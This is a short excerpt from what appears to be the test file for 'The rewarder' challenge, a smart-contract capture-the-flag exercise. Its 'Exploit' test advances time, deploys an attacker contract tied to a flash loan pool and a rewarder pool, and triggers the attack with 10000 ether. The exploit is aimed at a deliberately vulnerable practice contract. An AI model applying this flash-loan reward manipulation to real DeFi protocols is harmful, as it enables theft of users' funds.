...
const AttackerContract = contract.fromArtifact('TheRewarderAttacker');
...
describe('[Challenge] The rewarder', function () {
    ...
    it('Exploit', async function () {
        await time.increase(time.duration.days(5));
        this.attackerContract = await AttackerContract.new(this.flashLoanPool.address, this.rewarderPool.address, {from: attacker})
        await this.attackerContract.executeAttack(ether('10000'), {from: attacker});
    });
